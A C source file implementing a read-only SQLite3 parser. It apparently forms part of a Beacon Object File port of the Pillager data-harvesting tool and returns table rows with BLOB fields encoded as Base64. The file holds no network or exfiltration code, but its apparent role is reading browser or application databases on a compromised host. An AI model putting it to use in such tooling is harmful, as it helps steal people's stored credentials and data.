/* SQLite3 只读解析 — 与 Pillager Helper/SQLiteHandler 行为对齐（UTF-8 库、BLOB→Base64） */
#include "plg_common.h"
#include <stdint.h>

typedef struct {
	int64_t row_id;
	char item_type[64];
	char item_name[128];
	int64_t root_num;
	char sql_statement[4096];
} master_entry_t;

typedef struct {
	int64_t row_id;
	char *cell[PLG_MAX_ROW_FIELDS];
} table_row_t;

struct PlgSqlite {
	const unsigned char *owned; /* heap copy */
	const unsigned char *bytes;
	size_t blen;
	uint64_t encoding;
	uint16_t page_size;
	int nmaster;
	master_entry_t master[PLG_MAX_MASTER];
	char field_names[PLG_MAX_ROW_FIELDS][64];
	int ncol;
	table_row_t *rows;
	int nrows;
};

static const unsigned char SQLTYPE_SZ[] = { 0, 1, 2, 3, 4, 6, 8, 8, 0, 0 };

static uint64_t sl_be(const unsigned char *p, int n) {
	uint64_t v = 0;
	int i;
	for (i = 0; i < n; i++)
		v = (v << 8) | p[i];
	return v;
}

static int sl_gvl(PlgSqlite *db, int si) {
	int end = si + 8;
	int i;
	if (si > (int)db->blen)
		return 0;
	for (i = si; i <= end && (size_t)i < db->blen; i++) {
		if ((db->bytes[i] & 0x80) == 0)
			return i;
	}
	return si + 8;
}

static int64_t sl_cvl(PlgSqlite *db, int start, int end) {
	unsigned char buf[8];
	int num4 = end - start + 1;
	int num2, num3, idx, flag = 0;
	int i;
	int64_t out;
	if (num4 <= 0 || num4 > 9)
		return 0;
	MSVCRT$memset(buf, 0, 8);
	if (num4 == 1) {
		buf[0] = (unsigned char)(db->bytes[start] & 0x7f);
		MSVCRT$memcpy(&out, buf, 8);
		return out;
	}
	if (num4 == 9)
		flag = 1;
	num2 = 1;
	num3 = 7;
	idx = 0;
	if (flag) {
		buf[0] = db->bytes[end];
		end--;
		idx = 1;
	}
	for (i = end; i >= start; i--) {
		if (i - 1 >= start) {
			buf[idx] = (unsigned char)(((db->bytes[i] >> ((num2 - 1) & 7)) & (0xff >> num2)) |
				(db->bytes[i - 1] << (num3 & 7)));
			num2++;
			idx++;
			num3--;
		} else if (!flag) {
			buf[idx] = (unsigned char)(((db->bytes[i] >> ((num2 - 1) & 7)) & (0xff >> num2)));
		}
	}
	MSVCRT$memcpy(&out, buf, 8);
	return out;
}

static int sl_odd(int64_t v) { return (int)(v & 1LL); }

static void plg_b64_encode(const unsigned char *src, int len, char *dst, size_t dstsz) {
	static const char *T = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
	int i = 0, o = 0;
	while (i < len) {
		unsigned a = i < len ? src[i++] : 0;
		unsigned b = i < len ? src[i++] : 0;
		unsigned c = i < len ? src[i++] : 0;
		unsigned triple = (a << 16) | (b << 8) | c;
		if ((size_t)o + 4 >= dstsz)
			break;
		dst[o++] = T[(triple >> 18) & 63];
		dst[o++] = T[(triple >> 12) & 63];
		dst[o++] = (i > len + 1) ? '=' : T[(triple >> 6) & 63];
		dst[o++] = (i > len) ? '=' : T[triple & 63];
	}
	dst[o] = 0;
}

static void sl_int_to_str(int64_t v, char *out, size_t osz) {
	char tmp[32];
	int i = 0, neg = 0;
	size_t j;
	if (v < 0) {
		neg = 1;
		v = -v;
	}
	do {
		tmp[i++] = (char)('0' + (v % 10));
		v /= 10;
	} while (v && i < 31);
	j = 0;
	if (neg && j + 1 < osz)
		out[j++] = '-';
	while (i > 0 && j + 1 < osz)
		out[j++] = tmp[--i];
	out[j] = 0;
}

static void sl_uint64_to_str(uint64_t v, char *out, size_t osz) {
	char tmp[32];
	int i = 0;
	size_t j;
	if (v == 0) {
		out[0] = '0';
		out[1] = 0;
		return;
	}
	while (v && i < 31) {
		tmp[i++] = (char)('0' + (v % 10));
		v /= 10;
	}
	j = 0;
	while (i > 0 && j + 1 < osz)
		out[j++] = tmp[--i];
	out[j] = 0;
}

static int sl_read_master(PlgSqlite *db, uint64_t off);

static int sl_read_master(PlgSqlite *db, uint64_t off) {
	const unsigned char *b = db->bytes;
	if (off >= db->blen)
		return 0;
	if (b[off] == 13) {
		int num2 = (int)(sl_be(b + off + 3, 2) - 1);
		int base = db->nmaster;
		int i;
		if (base + num2 + 1 > PLG_MAX_MASTER)
			return 0;
		for (i = 0; i <= num2; i++) {
			uint64_t num = sl_be(b + off + 8 + (unsigned)(i * 2), 2);
			master_entry_t *me;
			int endIndex, num6;
			int64_t num7, num5;
			int64_t na[5];
			int idx;
			uint64_t enc;
			if (off != 100)
				num += off;
			endIndex = sl_gvl(db, (int)num);
			num7 = sl_cvl(db, (int)num, endIndex);
			num6 = sl_gvl(db, (int)(num + (unsigned)(endIndex - (int)num) + 1));
			me = &db->master[base + i];
			MSVCRT$memset(me, 0, sizeof(*me));
			me->row_id = sl_cvl(db, (int)(num + (unsigned)(endIndex - (int)num) + 1), num6);
			num = (uint64_t)((int64_t)num + (num6 - (int64_t)num) + 1);
			endIndex = sl_gvl(db, (int)num);
			num6 = endIndex;
			num5 = sl_cvl(db, (int)num, endIndex);
			idx = 0;
			do {
				endIndex = num6 + 1;
				num6 = sl_gvl(db, endIndex);
				na[idx] = sl_cvl(db, endIndex, num6);
				if (na[idx] > 9) {
					if (sl_odd(na[idx]))
						na[idx] = (na[idx] - 13) / 2;
					else
						na[idx] = (na[idx] - 12) / 2;
				} else
					na[idx] = SQLTYPE_SZ[(int)na[idx]];
				idx++;
			} while (idx <= 4);
			enc = db->encoding;
			if (enc == 1) {
				int p = (int)num + (int)num5;
				int L;
				if (p + (int)na[0] > (int)db->blen)
					return 0;
				L = (int)na[0];
				if (L >= (int)sizeof(me->item_type))
					L = (int)sizeof(me->item_type) - 1;
				MSVCRT$memcpy(me->item_type, b + p, (size_t)L);
				me->item_type[L] = 0;
				p += (int)na[0];
				if (p + (int)na[1] > (int)db->blen)
					return 0;
				L = (int)na[1];
				if (L >= (int)sizeof(me->item_name))
					L = (int)sizeof(me->item_name) - 1;
				MSVCRT$memcpy(me->item_name, b + p, (size_t)L);
				me->item_name[L] = 0;
				p += (int)na[1];
				if (p + (int)na[2] + (int)na[3] + (int)na[4] > (int)db->blen)
					return 0;
				p += (int)na[2];
				me->root_num = (int64_t)sl_be(b + p, (int)na[3]);
				p += (int)na[3];
				L = (int)na[4];
				if (L >= (int)sizeof(me->sql_statement))
					L = (int)sizeof(me->sql_statement) - 1;
				MSVCRT$memcpy(me->sql_statement, b + p, (size_t)L);
				me->sql_statement[L] = 0;
			}
		}
		db->nmaster = base + num2 + 1;
	} else if (b[off] == 5) {
		int num11 = (int)(sl_be(b + off + 3, 2) - 1);
		int j;
		for (j = 0; j <= num11; j++) {
			uint16_t si = (uint16_t)sl_be(b + off + 12 + (unsigned)(j * 2), 2);
			uint64_t tgt;
			if (off == 100)
				tgt = (sl_be(b + si, 4) - 1ULL) * db->page_size;
			else
				tgt = (sl_be(b + off + si, 4) - 1ULL) * db->page_size;
			sl_read_master(db, tgt);
		}
		sl_read_master(db, (sl_be(b + off + 8, 4) - 1ULL) * db->page_size);
	}
	return 1;
}

static int sl_read_rows(PlgSqlite *db, uint64_t off);

static int sl_read_rows(PlgSqlite *db, uint64_t off) {
	const unsigned char *b = db->bytes;
	if (off >= db->blen)
		return 0;
	if (b[off] == 13) {
		int num2 = (int)(sl_be(b + off + 3, 2) - 1);
		int length = db->nrows;
		int i, newtot = length + num2 + 1;
		table_row_t *nr;
		if (newtot > PLG_MAX_TABLE_ROWS)
			return 0;
		nr = (table_row_t *)plg_alloc(sizeof(table_row_t) * (size_t)newtot);
		if (!nr)
			return 0;
		if (db->rows) {
			MSVCRT$memcpy(nr, db->rows, sizeof(table_row_t) * (size_t)length);
			plg_free(db->rows);
		}
		db->rows = nr;
		for (i = 0; i <= num2; i++) {
			table_row_t *row = &db->rows[length + i];
			uint64_t num = sl_be(b + off + 8 + (unsigned)(i * 2), 2);
			struct {
				int64_t type, size;
			} fa[PLG_MAX_ROW_FIELDS];
			int nf = 0, j, k;
			int endIndex, num8;
			int64_t num7, num10;
			int num4;
			MSVCRT$memset(row, 0, sizeof(*row));
			if (off != 100)
				num += off;
			endIndex = sl_gvl(db, (int)num);
			(void)sl_cvl(db, (int)num, endIndex);
			num8 = sl_gvl(db, endIndex + 1);
			row->row_id = sl_cvl(db, endIndex + 1, num8);
			num = (uint64_t)(num8 + 1);
			endIndex = sl_gvl(db, (int)num);
			num8 = endIndex;
			num7 = sl_cvl(db, (int)num, endIndex);
			num10 = (int64_t)num - endIndex - 1;
			for (j = 0; num10 < num7 && nf < PLG_MAX_ROW_FIELDS; j++) {
				endIndex = num8 + 1;
				num8 = sl_gvl(db, endIndex);
				fa[nf].type = sl_cvl(db, endIndex, num8);
				if (fa[nf].type > 9) {
					if (sl_odd(fa[nf].type))
						fa[nf].size = (fa[nf].type - 13) / 2;
					else
						fa[nf].size = (fa[nf].type - 12) / 2;
				} else
					fa[nf].size = SQLTYPE_SZ[(int)fa[nf].type];
				num10 = num10 + (num8 - endIndex) + 1;
				nf++;
			}
			num4 = 0;
			for (k = 0; k < nf; k++) {
				int tbase = (int)num + (int)num7 + num4;
				if (fa[k].type > 9) {
					if (!sl_odd(fa[k].type)) {
						if (db->encoding == 1) {
							int sz = (int)fa[k].size;
							char *buf;
							if (tbase + sz > (int)db->blen)
								goto fail_row;
							buf = (char *)plg_alloc((size_t)(sz * 2 + 8));
							if (!buf)
								goto fail_row;
							plg_b64_encode(b + tbase, sz, buf, (size_t)(sz * 2 + 8));
							row->cell[k] = buf;
						}
					} else {
						int sz = (int)fa[k].size;
						char *buf;
						if (tbase + sz > (int)db->blen)
							goto fail_row;
						buf = (char *)plg_alloc((size_t)sz + 1);
						if (!buf)
							goto fail_row;
						MSVCRT$memcpy(buf, b + tbase, (size_t)sz);
						buf[sz] = 0;
						row->cell[k] = buf;
					}
				} else {
					char *buf = (char *)plg_alloc(32);
					int64_t vi;
					if (!buf)
						goto fail_row;
					if ((int)fa[k].size <= 8)
						vi = (int64_t)sl_be(b + tbase, (int)fa[k].size);
					else
						vi = 0;
					sl_int_to_str(vi, buf, 32);
					row->cell[k] = buf;
				}
				num4 += (int)fa[k].size;
			}
			continue;
fail_row:
			for (k = 0; k < PLG_MAX_ROW_FIELDS; k++)
				plg_free(row->cell[k]);
			MSVCRT$memset(row, 0, sizeof(*row));
		}
		db->nrows = newtot;
	} else if (b[off] == 5) {
		int num14 = (int)(sl_be(b + off + 3, 2) - 1);
		int m;
		for (m = 0; m <= num14; m++) {
			uint16_t n13 = (uint16_t)sl_be(b + off + 12 + (unsigned)(m * 2), 2);
			sl_read_rows(db, (sl_be(b + off + n13, 4) - 1ULL) * db->page_size);
		}
		sl_read_rows(db, (sl_be(b + off + 8, 4) - 1ULL) * db->page_size);
	}
	return 1;
}

PlgSqlite *plg_sqlite_open(const unsigned char *data, size_t len) {
	PlgSqlite *db;
	unsigned char *cpy;
	if (len < 100 || len > 80u * 1024u * 1024u)
		return NULL;
	if (MSVCRT$memcmp(data, "SQLite format 3", 15) != 0)
		return NULL;
	db = (PlgSqlite *)plg_alloc(sizeof(PlgSqlite));
	if (!db)
		return NULL;
	MSVCRT$memset(db, 0, sizeof(*db));
	cpy = (unsigned char *)plg_alloc(len);
	if (!cpy) {
		plg_free(db);
		return NULL;
	}
	MSVCRT$memcpy(cpy, data, len);
	db->owned = cpy;
	db->bytes = cpy;
	db->blen = len;
	if (cpy[0x34] != 0) {
		plg_free(cpy);
		plg_free(db);
		return NULL;
	}
	db->page_size = (uint16_t)sl_be(cpy + 0x10, 2);
	db->encoding = sl_be(cpy + 0x38, 4);
	if (db->encoding == 0)
		db->encoding = 1;
	sl_read_master(db, 100);
	return db;
}

void plg_sqlite_close(PlgSqlite *db) {
	int i, j;
	if (!db)
		return;
	if (db->rows) {
		for (i = 0; i < db->nrows; i++)
			for (j = 0; j < PLG_MAX_ROW_FIELDS; j++)
				plg_free(db->rows[i].cell[j]);
		plg_free(db->rows);
	}
	if (db->owned) {
		KERNEL32$HeapFree(PLG_heap, 0, (LPVOID)db->owned);
		db->owned = NULL;
	}
	plg_free(db);
}

int plg_sqlite_read_table(PlgSqlite *db, const char *table) {
	int idx = -1, i;
	const char *sql;
	const char *lp;
	int j, n;
	if (!db)
		return -1;
	for (i = 0; i < db->nmaster; i++) {
		if (MSVCRT$_stricmp(db->master[i].item_name, table) == 0) {
			idx = i;
			break;
		}
	}
	if (idx < 0)
		return -1;
	sql = db->master[idx].sql_statement;
	lp = MSVCRT$strchr(sql, '(');
	if (!lp)
		return -1;
	lp++;
	db->ncol = 0;
	for (j = 0, n = 1; *lp && db->ncol < PLG_MAX_ROW_FIELDS; ) {
		char *dst = db->field_names[db->ncol];
		int k = 0;
		while (*lp == ' ' || *lp == '\t' || *lp == '\n' || *lp == '\r')
			lp++;
		if (MSVCRT$strncmp(lp, "UNIQUE", 6) == 0)
			break;
		while (*lp && *lp != ',' && *lp != ')' && *lp != ' ' && k < 63)
			dst[k++] = *lp++;
		dst[k] = 0;
		if (k > 0)
			db->ncol++;
		while (*lp && *lp != ',')
			lp++;
		if (*lp == ',')
			lp++;
	}
	if (db->rows) {
		for (i = 0; i < db->nrows; i++)
			for (j = 0; j < PLG_MAX_ROW_FIELDS; j++)
				plg_free(db->rows[i].cell[j]);
		plg_free(db->rows);
		db->rows = NULL;
		db->nrows = 0;
	}
	{
		int64_t root = db->master[idx].root_num;
		uint64_t off = (uint64_t)((root - 1) * db->page_size);
		return sl_read_rows(db, off) ? db->nrows : -1;
	}
}

int plg_sqlite_row_count(PlgSqlite *db) { return db ? db->nrows : 0; }

const char *plg_sqlite_get(PlgSqlite *db, int row, const char *field) {
	int c = -1, i;
	if (!db || row < 0 || row >= db->nrows)
		return NULL;
	for (i = 0; i < db->ncol; i++) {
		if (MSVCRT$_stricmp(db->field_names[i], field) == 0) {
			c = i;
			break;
		}
	}
	if (c < 0 || c >= PLG_MAX_ROW_FIELDS)
		return NULL;
	return db->rows[row].cell[c];
}

long long plg_sqlite_row_id(PlgSqlite *db, int row) {
	if (!db || row < 0 || row >= db->nrows)
		return 0;
	return (long long)db->rows[row].row_id;
}
